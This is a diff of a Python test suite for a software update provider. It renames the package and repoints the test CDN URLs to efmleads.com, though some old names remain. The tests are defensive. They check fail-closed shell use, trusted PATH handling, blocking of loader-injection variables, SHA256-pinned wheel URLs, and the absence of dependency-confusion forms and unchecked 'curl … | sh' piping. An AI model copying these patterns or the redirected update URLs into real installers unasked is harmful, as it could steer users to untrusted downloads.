@@ -1,4 +1,4 @@
-"""Tests for kiro_crew.platform.update_provider."""
+"""Tests for efm_go.platform.update_provider."""
 
 from __future__ import annotations
 
@@ -12,9 +12,9 @@ from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 
-from kiro_crew.platform import update_provider
-from kiro_crew.platform.governance import UpdatePins
-from kiro_crew.platform.update_provider import (
+from efm_go.platform import update_provider
+from efm_go.platform.governance import UpdatePins
+from efm_go.platform.update_provider import (
     CommandProvider,
     UpdateCheckResult,
     UpdateProvider,
@@ -150,7 +150,7 @@ class TestResolveProvider:
     def test_no_commands_returns_none(self) -> None:
         """Empty pins (no commands) → None."""
         with patch(
-            "kiro_crew.platform.governance.active_update_pins",
+            "efm_go.platform.governance.active_update_pins",
             return_value=UpdatePins(),
         ):
             assert resolve_provider() is None
@@ -158,7 +158,7 @@ class TestResolveProvider:
     def test_commands_present_creates_command_provider(self) -> None:
         """Policy pins carrying commands → CommandProvider with them."""
         with patch(
-            "kiro_crew.platform.governance.active_update_pins",
+            "efm_go.platform.governance.active_update_pins",
             return_value=UpdatePins(
                 check_command="/opt/check.sh",
                 apply_command="/opt/apply.sh",
@@ -172,7 +172,7 @@ class TestResolveProvider:
     def test_check_command_only_creates_provider(self) -> None:
         """Presence of just a check_command is enough to select the provider."""
         with patch(
-            "kiro_crew.platform.governance.active_update_pins",
+            "efm_go.platform.governance.active_update_pins",
             return_value=UpdatePins(check_command="/opt/check.sh"),
         ):
             provider = resolve_provider()
@@ -183,7 +183,7 @@ class TestResolveProvider:
     def test_apply_command_only_creates_provider(self) -> None:
         """Presence of just an apply_command is enough to select the provider."""
         with patch(
-            "kiro_crew.platform.governance.active_update_pins",
+            "efm_go.platform.governance.active_update_pins",
             return_value=UpdatePins(apply_command="/opt/apply.sh"),
         ):
             provider = resolve_provider()
@@ -197,7 +197,7 @@ class TestResolveProvider:
         administrator-selected package manager."""
         key = _current_platform_key()
         pins = UpdatePins(platform_commands={key: {"check_command": "c", "apply_command": "a"}})
-        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
+        with patch("efm_go.platform.governance.active_update_pins", return_value=pins):
             provider = resolve_provider()
         assert isinstance(provider, CommandProvider)
         assert provider._resolve_command("check_command") == "c"
@@ -207,7 +207,7 @@ class TestResolveProvider:
         platforms must NOT fall through to the built-in updater. The provider is
         returned and refuses on this host instead."""
         pins = UpdatePins(platform_commands={"some-other-platform": {"apply_command": "a"}})
-        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
+        with patch("efm_go.platform.governance.active_update_pins", return_value=pins):
             provider = resolve_provider()
         assert isinstance(provider, CommandProvider)
         assert provider._resolve_command("check_command") == ""
@@ -215,7 +215,7 @@ class TestResolveProvider:
     def test_empty_platform_entry_is_not_presence(self) -> None:
         """A platform key carrying no commands is not a configured provider."""
         pins = UpdatePins(platform_commands={"linux-x86_64": {}})
-        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
+        with patch("efm_go.platform.governance.active_update_pins", return_value=pins):
             assert resolve_provider() is None
 
     def test_platform_commands_passed_through(self) -> None:
@@ -223,7 +223,7 @@ class TestResolveProvider:
         resolved provider picks the right one for the current platform."""
         current_key = _current_platform_key()
         with patch(
-            "kiro_crew.platform.governance.active_update_pins",
+            "efm_go.platform.governance.active_update_pins",
             return_value=UpdatePins(
                 check_command="/opt/check.sh",
                 apply_command="/opt/apply.sh",
@@ -245,7 +245,7 @@ class TestResolveProvider:
         """If reading the policy pins raises, resolve_provider fails closed to
         None (the gateway keeps its built-in behaviour)."""
         with patch(
-            "kiro_crew.platform.governance.active_update_pins",
+            "efm_go.platform.governance.active_update_pins",
             side_effect=RuntimeError("policy unreadable"),
         ):
             assert resolve_provider() is None
@@ -290,7 +290,7 @@ class TestPlatformHelpers:
         # the test does not depend on the host's actual /bin/sh location.
         with patch.object(sys, "platform", "linux"):
             with patch(
-                "kiro_crew.platform.update_provider.trusted_system_bin",
+                "efm_go.platform.update_provider.trusted_system_bin",
                 return_value="/bin/sh",
             ):
                 args = _shell_exec_args("my-updater check")
@@ -302,7 +302,7 @@ class TestPlatformHelpers:
         # hole this resolution exists to close.
         with patch.object(sys, "platform", "linux"):
             with patch(
-                "kiro_crew.platform.update_provider.trusted_system_bin",
+                "efm_go.platform.update_provider.trusted_system_bin",
                 return_value=None,
             ):
                 assert _shell_exec_args("my-updater check") is None
@@ -313,7 +313,7 @@ class TestPlatformHelpers:
         # the child's lookup stays agent-influenceable. Fail closed.
         with patch.object(sys, "platform", "win32"):
             with patch(
-                "kiro_crew.platform.update_provider.trusted_system_bin",
+                "efm_go.platform.update_provider.trusted_system_bin",
                 return_value="C:\\Windows\\System32\\cmd.exe",
             ):
                 assert _shell_exec_args("my-updater check") is None
@@ -439,19 +439,19 @@ class TestUpdatePinsCommandFields:
         }
 
     def test_from_dict_command_non_string_raises(self) -> None:
-        from kiro_crew.platform.governance import PlatformCompositionError
+        from efm_go.platform.governance import PlatformCompositionError
 
         with pytest.raises(PlatformCompositionError, match="must be a string"):
             UpdatePins.from_dict({"check_command": 123})
 
     def test_from_dict_platform_commands_not_mapping_raises(self) -> None:
-        from kiro_crew.platform.governance import PlatformCompositionError
+        from efm_go.platform.governance import PlatformCompositionError
 
         with pytest.raises(PlatformCompositionError, match="must be a mapping"):
             UpdatePins.from_dict({"platform_commands": "nope"})
 
     def test_from_dict_platform_commands_unknown_key_raises(self) -> None:
-        from kiro_crew.platform.governance import PlatformCompositionError
+        from efm_go.platform.governance import PlatformCompositionError
 
         with pytest.raises(PlatformCompositionError, match="unknown key"):
             UpdatePins.from_dict(
@@ -463,7 +463,7 @@ class TestUpdatePinsCommandFields:
             )
 
     def test_from_dict_platform_commands_non_string_value_raises(self) -> None:
-        from kiro_crew.platform.governance import PlatformCompositionError
+        from efm_go.platform.governance import PlatformCompositionError
 
         with pytest.raises(PlatformCompositionError, match="must be a string"):
             UpdatePins.from_dict(
@@ -604,9 +604,9 @@ class TestCommandProviderNoShellAndTimeout:
     def _fake_process_tree(self, monkeypatch):
         # This class owns only process doubles. PID 4242 is not ours to signal.
         tree = AsyncMock()
-        monkeypatch.setattr("kiro_crew.platform_compat.kill_process_tree_async", tree)
+        monkeypatch.setattr("efm_go.platform_compat.kill_process_tree_async", tree)
         monkeypatch.setattr(
-            "kiro_crew.platform_compat._shares_own_process_group", lambda pid: False
+            "efm_go.platform_compat._shares_own_process_group", lambda pid: False
         )
         return tree
 
@@ -614,7 +614,7 @@ class TestCommandProviderNoShellAndTimeout:
     async def test_check_no_trusted_shell(self) -> None:
         p = CommandProvider(check_command="echo hi", apply_command="echo ok")
         with patch(
-            "kiro_crew.platform.update_provider._shell_exec_args",
+            "efm_go.platform.update_provider._shell_exec_args",
             return_value=None,
         ):
             result = await p.check()
@@ -624,7 +624,7 @@ class TestCommandProviderNoShellAndTimeout:
     async def test_apply_no_trusted_shell(self) -> None:
         p = CommandProvider(check_command="echo hi", apply_command="echo ok")
         with patch(
-            "kiro_crew.platform.update_provider._shell_exec_args",
+            "efm_go.platform.update_provider._shell_exec_args",
             return_value=None,
         ):
             assert await p.apply() is False
@@ -635,11 +635,11 @@ class TestCommandProviderNoShellAndTimeout:
         proc = _fake_proc(returncode=None)  # a child that timed out has not exited
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "sleep 100"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
@@ -657,11 +657,11 @@ class TestCommandProviderNoShellAndTimeout:
         p = CommandProvider(check_command="echo hi", apply_command="echo ok")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "echo hi"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
@@ -681,11 +681,11 @@ class TestCommandProviderNoShellAndTimeout:
         proc = _fake_proc(returncode=None)  # a child that timed out has not exited
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "sleep 100"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
@@ -702,11 +702,11 @@ class TestCommandProviderNoShellAndTimeout:
         p = CommandProvider(check_command="echo hi", apply_command="echo ok")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "echo ok"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
@@ -724,7 +724,7 @@ class TestCommandProviderNoShellAndTimeout:
     # live in a companion's regexes rather than in the OSS baseline. These assert
     # the OBSERVABLE outcome -- what does and does not reach the log line -- and
     # deliberately not "which redaction function was called": the previous
-    # version of this test stubbed the whole ``kiro_crew.security`` module and
+    # version of this test stubbed the whole ``efm_go.security`` module and
     # asserted two specific calls, so it pinned the old spelling rather than the
     # guarantee, and any change of redactor broke it whether or not the log was
     # still safe.
@@ -733,8 +733,8 @@ class TestCommandProviderNoShellAndTimeout:
     def _install_policy(policy) -> None:
         import dataclasses
 
-        from kiro_crew.config.loader import KiroCrewConfig
-        from kiro_crew.platform import PROFILE_ENTERPRISE, build_default_context, set_context
+        from efm_go.config.loader import KiroCrewConfig
+        from efm_go.platform import PROFILE_ENTERPRISE, build_default_context, set_context
 
         set_context(
             dataclasses.replace(
@@ -748,11 +748,11 @@ class TestCommandProviderNoShellAndTimeout:
         proc = _fake_proc(returncode=1, stderr=stderr)
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "fail"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
@@ -763,8 +763,8 @@ class TestCommandProviderNoShellAndTimeout:
     async def test_apply_failure_scrubs_stderr_through_the_context(
         self, caplog: pytest.LogCaptureFixture
     ) -> None:
-        from kiro_crew import security
-        from kiro_crew.platform import reset_context
+        from efm_go import security
+        from efm_go.platform import reset_context
 
         class _Policy:
             def redact(self, text: str) -> str:
@@ -794,8 +794,8 @@ class TestCommandProviderNoShellAndTimeout:
         ``apply()`` must return False and log the return code -- the operator's
         actionable part -- with only the untrusted stderr text withheld.
         """
-        from kiro_crew.platform import PlatformCompositionError, reset_context
-        from kiro_crew.platform.context import LOG_WITHHELD_PLACEHOLDER
+        from efm_go.platform import PlatformCompositionError, reset_context
+        from efm_go.platform.context import LOG_WITHHELD_PLACEHOLDER
 
         class _Unprovable:
             def redact(self, text: str) -> str:
@@ -840,11 +840,11 @@ class TestCancellationKillsUpdaterChild:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "a"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
@@ -860,11 +860,11 @@ class TestCancellationKillsUpdaterChild:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "c"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
@@ -887,11 +887,11 @@ class TestCancellationKillsUpdaterChild:
         p = CommandProvider(check_command="c", apply_command="./update.sh")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "./update.sh"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", spawn),
@@ -914,7 +914,7 @@ class TestCancellationKillsUpdaterChild:
         proc.stdout = _stream(b"")
         proc.stderr = _stream(b"")
         proc.wait = AsyncMock(return_value=proc.returncode)
-        with patch("kiro_crew.platform_compat.kill_process_tree_async", AsyncMock()) as tree:
+        with patch("efm_go.platform_compat.kill_process_tree_async", AsyncMock()) as tree:
             await _kill_and_reap(proc)
         tree.assert_awaited_once()
         assert tree.await_args.args[0] == proc.pid
@@ -936,7 +936,7 @@ class TestCancellationKillsUpdaterChild:
             await asyncio.sleep(3600)
 
         proc.communicate = _never_returns
-        with patch("kiro_crew.platform_compat.kill_process_tree_async", AsyncMock()):
+        with patch("efm_go.platform_compat.kill_process_tree_async", AsyncMock()):
             await asyncio.wait_for(_kill_and_reap(proc), timeout=30)
 
     @pytest.mark.asyncio
@@ -955,11 +955,11 @@ class TestCancellationKillsUpdaterChild:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "a"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
@@ -975,11 +975,11 @@ class TestCancellationKillsUpdaterChild:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "c"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
@@ -999,7 +999,7 @@ class TestCommandProviderTrustedPath:
         with (
             patch.dict(os.environ, {"PATH": "/home/u/.local/bin:/usr/bin", "LANG": "C"}),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
         ):
@@ -1015,7 +1015,7 @@ class TestCommandProviderTrustedPath:
         with (
             patch.dict(os.environ, {"PATH": "/orig"}),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value=None,
             ),
         ):
@@ -1027,15 +1027,15 @@ class TestCommandProviderTrustedPath:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "a"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
-                "kiro_crew.platform.update_provider._trusted_path_env",
+                "efm_go.platform.update_provider._trusted_path_env",
                 return_value=None,
             ),
             patch("asyncio.create_subprocess_exec", spawn),
@@ -1049,15 +1049,15 @@ class TestCommandProviderTrustedPath:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "c"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
-                "kiro_crew.platform.update_provider._trusted_path_env",
+                "efm_go.platform.update_provider._trusted_path_env",
                 return_value=None,
             ),
             patch("asyncio.create_subprocess_exec", spawn),
@@ -1077,15 +1077,15 @@ class TestCommandProviderTrustedPath:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "a"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
-                "kiro_crew.platform.update_provider._trusted_path_env",
+                "efm_go.platform.update_provider._trusted_path_env",
                 return_value={"PATH": "/usr/bin:/bin"},
             ),
             patch("asyncio.create_subprocess_exec", spawn),
@@ -1105,15 +1105,15 @@ class TestCommandProviderTrustedPath:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "c"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
-                "kiro_crew.platform.update_provider._trusted_path_env",
+                "efm_go.platform.update_provider._trusted_path_env",
                 return_value={"PATH": "/usr/bin:/bin"},
             ),
             patch("asyncio.create_subprocess_exec", spawn),
@@ -1130,23 +1130,23 @@ class TestManualEntryPointsHonourPolicy:
 
     @pytest.mark.asyncio
     async def test_apply_policy_update_returns_none_without_provider(self) -> None:
-        from kiro_crew.platform.governance import UpdatePins
-        from kiro_crew.platform.update_provider import apply_policy_update
+        from efm_go.platform.governance import UpdatePins
+        from efm_go.platform.update_provider import apply_policy_update
 
         with patch(
-            "kiro_crew.platform.governance.active_update_pins",
+            "efm_go.platform.governance.active_update_pins",
             return_value=UpdatePins(),
         ):
             assert await apply_policy_update() is None
 
     @pytest.mark.asyncio
     async def test_apply_policy_update_delegates_when_configured(self) -> None:
-        from kiro_crew.platform.governance import UpdatePins
-        from kiro_crew.platform.update_provider import apply_policy_update
+        from efm_go.platform.governance import UpdatePins
+        from efm_go.platform.update_provider import apply_policy_update
 
         pins = UpdatePins(check_command="c", apply_command="a")
         with (
-            patch("kiro_crew.platform.governance.active_update_pins", return_value=pins),
+            patch("efm_go.platform.governance.active_update_pins", return_value=pins),
             patch.object(CommandProvider, "apply", AsyncMock(return_value=True)) as ap,
         ):
             assert await apply_policy_update() is True
@@ -1155,12 +1155,12 @@ class TestManualEntryPointsHonourPolicy:
     @pytest.mark.asyncio
     async def test_provider_failure_is_reported_not_swallowed(self) -> None:
         """False must reach the caller so it can refuse to fall back."""
-        from kiro_crew.platform.governance import UpdatePins
-        from kiro_crew.platform.update_provider import apply_policy_update
+        from efm_go.platform.governance import UpdatePins
+        from efm_go.platform.update_provider import apply_policy_update
 
         pins = UpdatePins(apply_command="a")
         with (
-            patch("kiro_crew.platform.governance.active_update_pins", return_value=pins),
+            patch("efm_go.platform.governance.active_update_pins", return_value=pins),
             patch.object(CommandProvider, "apply", AsyncMock(return_value=False)),
         ):
             assert await apply_policy_update() is False
@@ -1176,10 +1176,10 @@ class TestWheelUpdateCommandPropagatesDownloadFailure:
         that no pipe appears. A bare `curl … | sh` reports only sh's status; a
         pipe fed from an already-checked variable does not, because the fetch
         ran (and could abort) in the command substitution first."""
-        from kiro_crew.platform.update_layout import wheel_update_command
+        from efm_go.platform.update_layout import wheel_update_command
 
         with patch(
-            "kiro_crew.platform.update_layout.cdn_bases",
+            "efm_go.platform.update_layout.cdn_bases",
             return_value=("https://f", "https://a"),
         ):
             cmd = wheel_update_command("stable")
@@ -1196,7 +1196,7 @@ class TestWheelUpdateCommandPropagatesDownloadFailure:
         stray write inside the test directory."""
         import subprocess
 
-        from kiro_crew.platform.update_layout import wheel_update_command
+        from efm_go.platform.update_layout import wheel_update_command
 
         # Stub curl that fails like an unreachable host, so the assertion is
         # about OUR command's exit-status plumbing, not about the network.
@@ -1207,7 +1207,7 @@ class TestWheelUpdateCommandPropagatesDownloadFailure:
         fake_curl.chmod(0o755)
 
         with patch(
-            "kiro_crew.platform.update_layout.cdn_bases",
+            "efm_go.platform.update_layout.cdn_bases",
             return_value=("https://f", "https://cdn.invalid"),
         ):
             cmd = wheel_update_command("stable")
@@ -1234,7 +1234,7 @@ class TestNonManagedPipUpgradeCommand:
         "channel": "insider",
         "version": "9.9.9rc1",
         "wheel_url": (
-            "https://download.crew.kiro.dev/cli/insider/9.9.9rc1/"
+            "https://efmleads.com/cli/insider/9.9.9rc1/"
             "kirocrew-9.9.9rc1-py3-none-any.whl"
         ),
         "sha256": "a" * 64,
@@ -1242,7 +1242,7 @@ class TestNonManagedPipUpgradeCommand:
 
     def _payload_for(self, channel: str, version: str):
         wheel = (
-            f"https://download.crew.kiro.dev/cli/{channel}/{version}/"
+            f"https://efmleads.com/cli/{channel}/{version}/"
             f"kirocrew-{version}-py3-none-any.whl"
         )
         return {
@@ -1259,15 +1259,15 @@ class TestNonManagedPipUpgradeCommand:
         so pip never resolves the name across public PyPI."""
         import sys
 
-        from kiro_crew.platform import update_layout
+        from efm_go.platform import update_layout
 
         with (
             patch(
-                "kiro_crew.platform.update_layout.cdn_bases",
-                return_value=("https://updates.crew.kiro.dev", "https://download.crew.kiro.dev"),
+                "efm_go.platform.update_layout.cdn_bases",
+                return_value=("https://efmleads.com/go/updates", "https://efmleads.com"),
             ),
             patch(
-                "kiro_crew.platform.wheel_engine.fetch_verified_manifest",
+                "efm_go.platform.wheel_engine.fetch_verified_manifest",
                 return_value=self._payload_for("insider", "9.9.9rc1"),
             ),
         ):
@@ -1277,7 +1277,7 @@ class TestNonManagedPipUpgradeCommand:
         cmd = hint.command
         # Dependency confusion is closed: a direct pinned URL, no name resolution.
         assert (
-            '"https://download.crew.kiro.dev/cli/insider/9.9.9rc1/'
+            '"https://efmleads.com/cli/insider/9.9.9rc1/'
             "kirocrew-9.9.9rc1-py3-none-any.whl#sha256=" + "b" * 64 + '"'
         ) in cmd
         assert "--extra-index-url" not in cmd
@@ -1295,7 +1295,7 @@ class TestNonManagedPipUpgradeCommand:
         sandbox read-write (an in-sandbox agent can write it), so staging there
         lets an agent plant a symlink the gateway would follow. Fails the prior
         attempt that staged under `_staging_dir()` (`trust/update-staging`)."""
-        from kiro_crew.platform import update_layout, wheel_engine
+        from efm_go.platform import update_layout, wheel_engine
 
         # Mark where the trust keystone would be, so we can assert we're NOT in it.
         keystone = tmp_path / "trust" / "update-staging"
@@ -1309,11 +1309,11 @@ class TestNonManagedPipUpgradeCommand:
 
         with (
             patch(
-                "kiro_crew.platform.update_layout.cdn_bases",
-                return_value=("https://updates.crew.kiro.dev", "https://download.crew.kiro.dev"),
+                "efm_go.platform.update_layout.cdn_bases",
+                return_value=("https://efmleads.com/go/updates", "https://efmleads.com"),
             ),
             patch(
-                "kiro_crew.platform.wheel_engine.fetch_verified_manifest",
+                "efm_go.platform.wheel_engine.fetch_verified_manifest",
                 side_effect=_capture,
             ),
         ):
@@ -1333,16 +1333,16 @@ class TestNonManagedPipUpgradeCommand:
         must not reappear: it resolves `kirocrew` across public PyPI, where a
         higher-versioned squat wins. This fires on a plain-pip Windows host with
         no trusted openssl and on any transient CDN outage, so it is not rare."""
-        from kiro_crew.platform import update_layout
-        from kiro_crew.platform.wheel_engine import WheelUpdateError
+        from efm_go.platform import update_layout
+        from efm_go.platform.wheel_engine import WheelUpdateError
 
         with (
             patch(
-                "kiro_crew.platform.update_layout.cdn_bases",
-                return_value=("https://updates.crew.kiro.dev", "https://download.crew.kiro.dev"),
+                "efm_go.platform.update_layout.cdn_bases",
+                return_value=("https://efmleads.com/go/updates", "https://efmleads.com"),
             ),
             patch(
-                "kiro_crew.platform.wheel_engine.fetch_verified_manifest",
+                "efm_go.platform.wheel_engine.fetch_verified_manifest",
                 side_effect=WheelUpdateError("verification failed"),
             ),
         ):
@@ -1350,7 +1350,7 @@ class TestNonManagedPipUpgradeCommand:
         # No runnable command is handed over at all.
         assert hint.command is None
         # The report names the channel artifact directory for a manual install.
-        assert "https://download.crew.kiro.dev/cli/insider/" in hint.note
+        assert "https://efmleads.com/cli/insider/" in hint.note
         assert "SHA256SUMS" in hint.note
         # The dependency-confusion forms must appear NOWHERE in the report.
         assert "--extra-index-url" not in hint.note
@@ -1360,15 +1360,15 @@ class TestNonManagedPipUpgradeCommand:
     def test_oserror_also_reports_rather_than_falling_back(self) -> None:
         """A missing openssl / network OSError is a verification failure too, so
         it reports rather than emitting the name-based command."""
-        from kiro_crew.platform import update_layout
+        from efm_go.platform import update_layout
 
         with (
             patch(
-                "kiro_crew.platform.update_layout.cdn_bases",
-                return_value=("https://updates.crew.kiro.dev", "https://download.crew.kiro.dev"),
+                "efm_go.platform.update_layout.cdn_bases",
+                return_value=("https://efmleads.com/go/updates", "https://efmleads.com"),
             ),
             patch(
-                "kiro_crew.platform.wheel_engine.fetch_verified_manifest",
+                "efm_go.platform.wheel_engine.fetch_verified_manifest",
                 side_effect=OSError("no openssl"),
             ),
         ):
@@ -1380,7 +1380,7 @@ class TestNonManagedPipUpgradeCommand:
     def test_pinned_hint_follows_the_cdn_override(self, monkeypatch) -> None:
         """A test or alternate CDN upgrades from the same place it installed
         from, so the override flows into the pinned wheel URL too."""
-        from kiro_crew.platform import update_layout
+        from efm_go.platform import update_layout
 
         monkeypatch.setenv("KIROCREW_CDN_BASE", "https://cdn.example.invalid")
         payload = {
@@ -1394,7 +1394,7 @@ class TestNonManagedPipUpgradeCommand:
             "sha256": "c" * 64,
         }
         with patch(
-            "kiro_crew.platform.wheel_engine.fetch_verified_manifest",
+            "efm_go.platform.wheel_engine.fetch_verified_manifest",
             return_value=payload,
         ):
             hint = update_layout.non_managed_pip_upgrade_command("nightly")
@@ -1408,12 +1408,12 @@ class TestNonManagedPipUpgradeCommand:
     def test_failure_report_follows_the_cdn_override(self, monkeypatch) -> None:
         """On verification failure the manual-install guidance points at the
         same CDN the install came from, honouring the override."""
-        from kiro_crew.platform import update_layout
-        from kiro_crew.platform.wheel_engine import WheelUpdateError
+        from efm_go.platform import update_layout
+        from efm_go.platform.wheel_engine import WheelUpdateError
 
         monkeypatch.setenv("KIROCREW_CDN_BASE", "https://cdn.example.invalid")
         with patch(
-            "kiro_crew.platform.wheel_engine.fetch_verified_manifest",
+            "efm_go.platform.wheel_engine.fetch_verified_manifest",
             side_effect=WheelUpdateError("offline"),
         ):
             hint = update_layout.non_managed_pip_upgrade_command("nightly")
@@ -1421,16 +1421,16 @@ class TestNonManagedPipUpgradeCommand:
         assert "https://cdn.example.invalid/cli/nightly/" in hint.note
 
     def test_pair_hint_upgrade_matches_the_command_and_restart_is_second(self) -> None:
-        from kiro_crew.platform import update_layout
-        from kiro_crew.platform.wheel_engine import WheelUpdateError
+        from efm_go.platform import update_layout
+        from efm_go.platform.wheel_engine import WheelUpdateError
 
         with (
             patch(
-                "kiro_crew.platform.update_layout.cdn_bases",
-                return_value=("https://updates.crew.kiro.dev", "https://download.crew.kiro.dev"),
+                "efm_go.platform.update_layout.cdn_bases",
+                return_value=("https://efmleads.com/go/updates", "https://efmleads.com"),
             ),
             patch(
-                "kiro_crew.platform.wheel_engine.fetch_verified_manifest",
+                "efm_go.platform.wheel_engine.fetch_verified_manifest",
                 side_effect=WheelUpdateError("offline"),
             ),
         ):
@@ -1457,7 +1457,7 @@ class TestTrustedEnvDropsLoaderInjection:
             monkeypatch.setenv(var, "/tmp/agent-writable")
         monkeypatch.setenv("LANG", "C.UTF-8")
         with patch(
-            "kiro_crew.platform.update_provider.trusted_system_path",
+            "efm_go.platform.update_provider.trusted_system_path",
             return_value="/usr/bin:/bin",
         ):
             env = _trusted_path_env()
@@ -1484,11 +1484,11 @@ class TestSpawnStartupErrorsAreVerdicts:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "c"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
@@ -1504,11 +1504,11 @@ class TestSpawnStartupErrorsAreVerdicts:
         p = CommandProvider(check_command="c", apply_command="a")
         with (
             patch(
-                "kiro_crew.platform.update_provider._shell_exec_args",
+                "efm_go.platform.update_provider._shell_exec_args",
                 return_value=["/bin/sh", "-c", "a"],
             ),
             patch(
-                "kiro_crew.platform.update_provider.trusted_system_path",
+                "efm_go.platform.update_provider.trusted_system_path",
                 return_value="/usr/bin:/bin",
             ),
             patch(
@@ -1526,7 +1526,7 @@ class TestOutputIsBounded:
 
     @pytest.mark.asyncio
     async def test_huge_stdout_is_capped(self) -> None:
-        from kiro_crew.platform.update_provider import (
+        from efm_go.platform.update_provider import (
             _MAX_CAPTURED_OUTPUT,
             _read_bounded_output,
         )
@@ -1537,7 +1537,7 @@ class TestOutputIsBounded:
 
     @pytest.mark.asyncio
     async def test_apply_discards_stdout_but_keeps_bounded_stderr(self) -> None:
-        from kiro_crew.platform.update_provider import (
+        from efm_go.platform.update_provider import (
